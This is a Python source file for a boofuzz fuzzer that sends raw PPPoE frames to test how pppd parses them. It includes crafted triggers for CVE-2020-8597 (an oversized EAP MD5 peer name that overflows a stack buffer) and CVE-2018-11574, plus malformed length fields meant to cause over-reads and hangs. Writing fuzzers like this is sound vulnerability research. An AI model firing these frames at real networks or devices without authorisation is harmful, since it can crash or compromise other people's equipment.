"""PPP / PPPoE (with EAP) Fuzzer

Layer-2 raw fuzzer for PPP-over-Ethernet sessions and the PPP control
protocols they carry (LCP, IPCP, CHAP, EAP). Targets the real pppd /
PPPoE parsing bugs, not just discovery-frame scraps:

CVE Coverage:
- CVE-2020-8597: pppd EAP-Request/Response rhostname stack buffer overflow.
  An EAP-Request/MD5-Challenge (type 4) carries a 1-byte value-size followed
  by a trailing peer-name field. pppd's eap_request()/eap_response() copies
  that name into a fixed rhostname[] stack buffer using the *packet* length
  rather than the buffer size -> classic stack overflow. This is the real
  write primitive; see PPPoE_EAP_MD5_Name_Overflow.
- CVE-2018-11574: pppd EAP-TLS length handling. An EAP-Request/TLS (type 13)
  whose embedded TLS-length field disagrees with the bytes actually present
  drives an out-of-bounds read/parse; see PPPoE_EAP_TLS_Len_Underflow.
- LCP/IPCP option-walk bugs: a configuration option whose length byte is 0
  (non-advancing option loop -> infinite loop / hang) or larger than the
  remaining packet (over-read); see PPPoE_LCP_Option_ZeroLen and
  PPPoE_IPCP_Option_Len.
- PPPoE framing lies: a PADO/PADS discovery TAG whose declared length
  overruns the frame, and a PPPoE session-header `length` field that
  disagrees with the actual PPP payload; see PPPoE_Discovery_Tag_Len and
  PPPoE_Session_Length_Lie.

Framing:
    Ethernet(dst, src, ethertype=0x8864 session / 0x8863 discovery)
      -> PPPoE(ver/type=0x11, code, session_id:Word, length:Word)
        -> PPP protocol field:Word (0xC021 LCP, 0xC223 CHAP,
           0xC227 EAP, 0x8021 IPCP)
          -> protocol payload
"""

import socket
import struct
from typing import List, Optional

from boofuzz import Byte, Group, Request, Static, Word

from ..core.base_fuzzer import BaseFuzzer, RequestInfo
from ..core.config import FuzzerConfig, ProtocolType
from ..primitives.dynamic import SmartBytes
from ..monitors import BaseMonitor


class PPPoEFuzzer(BaseFuzzer):
    """PPP/PPPoE (with EAP) Layer-2 fuzzer.

    Raw Ethernet frames carrying PPPoE session / discovery packets and the
    PPP control protocols (LCP, IPCP, CHAP, EAP). Mirrors the Ethernet
    fuzzer's raw L2 connection model (ProtocolType.RAW, no traditional
    monitors).
    """

    # EtherTypes
    ETHERTYPE_PPPOE_D = 0x8863  # PPPoE Discovery
    ETHERTYPE_PPPOE_S = 0x8864  # PPPoE Session

    # PPP protocol field values (carried after the PPPoE session header)
    PPP_LCP = 0xC021
    PPP_IPCP = 0x8021
    PPP_CHAP = 0xC223
    PPP_EAP = 0xC227

    # PPPoE version/type nibble byte (ver=1, type=1)
    PPPOE_VER_TYPE = 0x11

    # PPPoE codes
    PPPOE_CODE_SESSION = 0x00
    PPPOE_CODE_PADO = 0x07
    PPPOE_CODE_PADS = 0x65

    # EAP codes / types
    EAP_CODE_REQUEST = 1
    EAP_TYPE_MD5 = 4
    EAP_TYPE_TLS = 13

    PROTOCOL_OPTIONS = {
        "interface": {
            "type": str,
            "default": "eth0",
            "description": "Network interface for raw socket operations",
            "example": "eth0",
        },
        "dst_mac": {
            "type": str,
            "default": "ff:ff:ff:ff:ff:ff",
            "description": "Destination MAC address (broadcast by default)",
            "example": "00:11:22:33:44:55",
        },
        "src_mac": {
            "type": str,
            "default": None,
            "description": "Source MAC address (auto-detect if not set)",
            "example": "aa:bb:cc:dd:ee:ff",
        },
        "session_id": {
            "type": int,
            "default": 1,
            "description": "PPPoE session id used for session-mode frames",
            "example": "1",
        },
    }

    @classmethod
    def get_request_definitions(cls) -> List[RequestInfo]:
        """Static request definitions for --list-requests (strict 1:1 names)."""
        return [
            RequestInfo(
                "PPPoE_Baseline",
                "Valid PPPoE Session frame carrying a well-formed LCP Configure-Request",
                "baseline",
            ),
            RequestInfo(
                "PPPoE_EAP_MD5_Name_Overflow",
                "EAP-Request/MD5-Challenge trailing peer-name overflow (CVE-2020-8597)",
                "overflow",
            ),
            RequestInfo(
                "PPPoE_EAP_TLS_Len_Underflow",
                "EAP-Request/TLS length field disagrees with actual bytes (CVE-2018-11574)",
                "malformed",
            ),
            RequestInfo(
                "PPPoE_LCP_Option_ZeroLen",
                "LCP option length byte = 0 (non-advancing walk) or larger than packet",
                "malformed",
            ),
            RequestInfo(
                "PPPoE_IPCP_Option_Len",
                "IPCP option length byte {0x00,0x01,0x02,0xFF} vs actual data",
                "boundary",
            ),
            RequestInfo(
                "PPPoE_Discovery_Tag_Len",
                "PADO/PADS TAG length overruns the frame / over-declared AC-Cookie",
                "malformed",
            ),
            RequestInfo(
                "PPPoE_Session_Length_Lie",
                "PPPoE header length field larger/smaller than the actual PPP payload",
                "boundary",
            ),
        ]

    def __init__(self, config: FuzzerConfig = None, connection_factory=None):
        if config:
            config.protocol_type = ProtocolType.RAW
        super().__init__(config, connection_factory)

        self.interface = config.get_option("interface", "eth0") if config else "eth0"
        self.dst_mac = (
            config.get_option("dst_mac", "ff:ff:ff:ff:ff:ff") if config else "ff:ff:ff:ff:ff:ff"
        )
        self.src_mac = config.get_option("src_mac", None) if config else None
        self.session_id = config.get_option("session_id", 1) if config else 1

        if not self.src_mac:
            self.src_mac = self._get_interface_mac()

    def _get_interface_mac(self) -> str:
        """Get MAC address of the network interface (fallback on failure)."""
        try:
            import fcntl

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            info = fcntl.ioctl(
                s.fileno(), 0x8927, struct.pack("256s", self.interface.encode("utf-8"))
            )
            mac_bytes = info[18:24]
            return ":".join(["%02x" % b for b in mac_bytes])
        except (OSError, ImportError, struct.error) as e:
            self.log.debug(f"Failed to get MAC address for interface '{self.interface}': {e}")
            return "00:11:22:33:44:55"

    def _mac_to_bytes(self, mac_str: str) -> bytes:
        """Convert MAC address string to bytes."""
        return bytes.fromhex(mac_str.replace(":", ""))

    def _eth_session(self) -> tuple:
        """Ethernet header children for a PPPoE Session frame (0x8864)."""
        return (
            Static("dst_mac", self._mac_to_bytes(self.dst_mac)),
            Static("src_mac", self._mac_to_bytes(self.src_mac)),
            Static("ethertype", struct.pack(">H", self.ETHERTYPE_PPPOE_S)),
        )

    def _eth_discovery(self, dst: Optional[str] = None) -> tuple:
        """Ethernet header children for a PPPoE Discovery frame (0x8863)."""
        return (
            Static("dst_mac", self._mac_to_bytes(dst or self.dst_mac)),
            Static("src_mac", self._mac_to_bytes(self.src_mac)),
            Static("ethertype", struct.pack(">H", self.ETHERTYPE_PPPOE_D)),
        )

    def _define_protocol(self):
        """Define the PPP/PPPoE request tree.

        Every session.connect() is gated on is_request_enabled() so
        --enable / --disable select requests one at a time (strict 1:1 with
        get_request_definitions()).
        """

        # ================================================================
        # 1. PPPoE_Baseline (baseline)
        # Valid PPPoE Session frame carrying an LCP Configure-Request with a
        # single well-formed option (Maximum-Receive-Unit, type 1, len 4).
        # ================================================================
        # LCP payload: code=1 (Configure-Request), id=1, length=8, then one
        # option: type=1 (MRU), len=4, value=0x05DC (1500).
        lcp_baseline_payload = (
            b"\x01"  # LCP code: Configure-Request
            + b"\x01"  # identifier
            + struct.pack(">H", 8)  # LCP length (header 4 + option 4)
            + b"\x01"  # option type: MRU
            + b"\x04"  # option length
            + struct.pack(">H", 0x05DC)  # MRU value 1500
        )
        baseline = Request(
            "PPPoE_Baseline",
            children=(
                *self._eth_session(),
                Byte("pppoe_ver_type", self.PPPOE_VER_TYPE),
                Byte("pppoe_code", self.PPPOE_CODE_SESSION),
                Word("session_id", self.session_id, endian=">"),
                # length = PPP protocol field (2) + LCP payload
                Word("pppoe_length", 2 + len(lcp_baseline_payload), endian=">"),
                Word("ppp_protocol", self.PPP_LCP, endian=">"),
                Static("lcp_payload", lcp_baseline_payload),
            ),
        )

        # ================================================================
        # 2. PPPoE_EAP_MD5_Name_Overflow (overflow) - CVE-2020-8597
        # EAP-Request/MD5-Challenge (type 4): value-size byte + a fixed MD5
        # value, then a trailing peer-name far longer than pppd's rhostname[]
        # stack buffer. This is the real stack-overflow write primitive.
        # ================================================================
        md5_value = b"\x10" + b"\xaa" * 16  # value-size=16, 16-byte challenge
        eap_md5_overflow = Request(
            "PPPoE_EAP_MD5_Name_Overflow",
            children=(
                *self._eth_session(),
                Byte("pppoe_ver_type", self.PPPOE_VER_TYPE),
                Byte("pppoe_code", self.PPPOE_CODE_SESSION),
                Word("session_id", self.session_id, endian=">"),
                # Length is deliberately left small/plausible; the overflow is
                # driven by the oversized trailing name, not this field.
                Word("pppoe_length", 0x00FF, endian=">"),
                Word("ppp_protocol", self.PPP_EAP, endian=">"),
                # EAP header
                Byte("eap_code", self.EAP_CODE_REQUEST),  # 1 = Request
                Byte("eap_id", 0x01),
                Word("eap_length", 0x00FF, endian=">"),  # lies vs real length
                Byte("eap_type", self.EAP_TYPE_MD5),  # 4 = MD5-Challenge
                # value-size(1) + value
                Static("eap_md5_value", md5_value),
                # Trailing peer-name: overflow the fixed rhostname[] buffer.
                Group(
                    "eap_peer_name",
                    values=[
                        b"A" * 64,
                        b"A" * 256,
                        b"A" * 1024,
                    ],
                ),
            ),
        )

        # ================================================================
        # 3. PPPoE_EAP_TLS_Len_Underflow (malformed) - CVE-2018-11574
        # EAP-Request/TLS (type 13). The TLS message-length dword disagrees
        # with the bytes actually present (declared >> actual = under-read of
        # a huge buffer; declared 0 with an L-flag set = length-flag lie).
        # ================================================================
        eap_tls_underflow = Request(
            "PPPoE_EAP_TLS_Len_Underflow",
            children=(
                *self._eth_session(),
                Byte("pppoe_ver_type", self.PPPOE_VER_TYPE),
                Byte("pppoe_code", self.PPPOE_CODE_SESSION),
                Word("session_id", self.session_id, endian=">"),
                Word("pppoe_length", 0x0020, endian=">"),
                Word("ppp_protocol", self.PPP_EAP, endian=">"),
                Byte("eap_code", self.EAP_CODE_REQUEST),
                Byte("eap_id", 0x01),
                Word("eap_length", 0x000C, endian=">"),
                Byte("eap_type", self.EAP_TYPE_TLS),  # 13 = EAP-TLS
                # EAP-TLS flags byte: bit 0x80 = Length-included (L)
                Byte("eap_tls_flags", 0x80),
                # TLS message length (4 bytes) that disagrees with real data.
                Group(
                    "eap_tls_length",
                    values=[
                        struct.pack(">I", 0xFFFFFFFF),  # declared 4G, ~0 present
                        struct.pack(">I", 0x00010000),  # declared 64K, ~0 present
                        struct.pack(">I", 0x00000000),  # L-flag set but len 0
                        struct.pack(">I", 0x00000001),  # off-by-one under-read
                    ],
                ),
                # A couple of real TLS bytes so the length field clearly lies.
                Static("eap_tls_data", b"\x16\x03"),
            ),
        )

        # ================================================================
        # 4. PPPoE_LCP_Option_ZeroLen (malformed)
        # LCP Configure-Request whose option length byte is 0 (a naive
        # option-walk `p += opt_len` never advances -> infinite loop / hang)
        # or larger than the remaining packet (over-read).
        # ================================================================
        lcp_zero_len = Request(
            "PPPoE_LCP_Option_ZeroLen",
            children=(
                *self._eth_session(),
                Byte("pppoe_ver_type", self.PPPOE_VER_TYPE),
                Byte("pppoe_code", self.PPPOE_CODE_SESSION),
                Word("session_id", self.session_id, endian=">"),
                Word("pppoe_length", 0x000A, endian=">"),
                Word("ppp_protocol", self.PPP_LCP, endian=">"),
                Byte("lcp_code", 0x01),  # Configure-Request
                Byte("lcp_id", 0x01),
                Word("lcp_length", 0x0008, endian=">"),
                Byte("lcp_opt_type", 0x01),  # MRU
                # Length byte: 0 (non-advancing) or > remaining packet.
                Group(
                    "lcp_opt_len",
                    values=[
                        b"\x00",  # zero -> option-walk never advances
                        b"\x01",  # < 2 minimum header -> under-length
                        b"\xff",  # 255 -> far beyond the option data present
                        b"\x7f",  # large-but-plausible over-read
                    ],
                ),
                Static("lcp_opt_data", struct.pack(">H", 0x05DC)),
            ),
        )

        # ================================================================
        # 5. PPPoE_IPCP_Option_Len (boundary)
        # IPCP (0x8021) IP-Address option (type 3) with a length byte cycling
        # {0x00, 0x01, 0x02, 0xFF} while the actual data is a 4-byte address.
        # ================================================================
        ipcp_option_len = Request(
            "PPPoE_IPCP_Option_Len",
            children=(
                *self._eth_session(),
                Byte("pppoe_ver_type", self.PPPOE_VER_TYPE),
                Byte("pppoe_code", self.PPPOE_CODE_SESSION),
                Word("session_id", self.session_id, endian=">"),
                Word("pppoe_length", 0x000C, endian=">"),
                Word("ppp_protocol", self.PPP_IPCP, endian=">"),
                Byte("ipcp_code", 0x01),  # Configure-Request
                Byte("ipcp_id", 0x01),
                Word("ipcp_length", 0x000A, endian=">"),
                Byte("ipcp_opt_type", 0x03),  # IP-Address
                Group(
                    "ipcp_opt_len",
                    values=[
                        b"\x00",  # zero length
                        b"\x01",  # 1 (< 2 header minimum)
                        b"\x02",  # 2 (header only, no address)
                        b"\xff",  # 255 (over-read past 4-byte address)
                    ],
                ),
                Static("ipcp_opt_addr", struct.pack(">I", 0xC0A80001)),  # 192.168.0.1
            ),
        )

        # ================================================================
        # 6. PPPoE_Discovery_Tag_Len (malformed)
        # PADO / PADS discovery frame (EtherType 0x8863) with an AC-Cookie
        # TAG whose declared length overruns the actual tag data present.
        # ================================================================
        discovery_tag_len = Request(
            "PPPoE_Discovery_Tag_Len",
            children=(
                *self._eth_discovery(),
                Byte("pppoe_ver_type", self.PPPOE_VER_TYPE),
                # PADO / PADS
                Group(
                    "pppoe_disc_code",
                    values=[
                        struct.pack("B", self.PPPOE_CODE_PADO),  # 0x07 PADO
                        struct.pack("B", self.PPPOE_CODE_PADS),  # 0x65 PADS
                    ],
                ),
                Word("session_id", 0x0000, endian=">"),
                Word("pppoe_length", 0x0040, endian=">"),
                # AC-Cookie tag type (0x0104), declared length lies vs data.
                Word("tag_type", 0x0104, endian=">"),
                Group(
                    "tag_len",
                    values=[
                        struct.pack(">H", 0xFFFF),  # 64K declared, few bytes present
                        struct.pack(">H", 0x0400),  # 1024 declared
                        struct.pack(">H", 0x0000),  # zero-len tag with data present
                        struct.pack(">H", 0x0010),  # 16 declared, 4 present
                    ],
                ),
                SmartBytes(
                    "tag_data", b"\xde\xad\xbe\xef", max_len=256, fuzzable=True
                ),  # AC-Cookie payload (variable-length -> Radamsa mutation)
            ),
        )

        # ================================================================
        # 7. PPPoE_Session_Length_Lie (boundary)
        # PPPoE session header `length` disagreeing with the real PPP payload:
        # over-declared (parser reads past frame) and declared 0.
        # ================================================================
        session_len_payload = b"\x01\x01" + struct.pack(">H", 8) + b"\x01\x04" + b"\x05\xdc"
        session_length_lie = Request(
            "PPPoE_Session_Length_Lie",
            children=(
                *self._eth_session(),
                Byte("pppoe_ver_type", self.PPPOE_VER_TYPE),
                Byte("pppoe_code", self.PPPOE_CODE_SESSION),
                Word("session_id", self.session_id, endian=">"),
                Group(
                    "pppoe_length",
                    values=[
                        struct.pack(">H", 0xFFFF),  # declared >> actual (over-read)
                        struct.pack(">H", 0x0100),  # declared > actual
                        struct.pack(">H", 0x0000),  # declared 0 (empty claim)
                        struct.pack(">H", 0x0002),  # declared < actual payload
                    ],
                ),
                Word("ppp_protocol", self.PPP_LCP, endian=">"),
                Static("ppp_payload", session_len_payload),
            ),
        )

        # ================================================================
        # Gated wiring - strict 1:1 with get_request_definitions()
        # ================================================================
        if self.is_request_enabled("PPPoE_Baseline"):
            self.session.connect(baseline)
        if self.is_request_enabled("PPPoE_EAP_MD5_Name_Overflow"):
            self.session.connect(eap_md5_overflow)
        if self.is_request_enabled("PPPoE_EAP_TLS_Len_Underflow"):
            self.session.connect(eap_tls_underflow)
        if self.is_request_enabled("PPPoE_LCP_Option_ZeroLen"):
            self.session.connect(lcp_zero_len)
        if self.is_request_enabled("PPPoE_IPCP_Option_Len"):
            self.session.connect(ipcp_option_len)
        if self.is_request_enabled("PPPoE_Discovery_Tag_Len"):
            self.session.connect(discovery_tag_len)
        if self.is_request_enabled("PPPoE_Session_Length_Lie"):
            self.session.connect(session_length_lie)

    def _get_monitors(self) -> List[BaseMonitor]:
        """No traditional monitors for raw L2 fuzzing (mirrors Ethernet)."""
        return []

    def setup_custom_monitors(self) -> Optional[List[BaseMonitor]]:
        """Setup PPPoE-specific monitors."""
        return self._get_monitors()
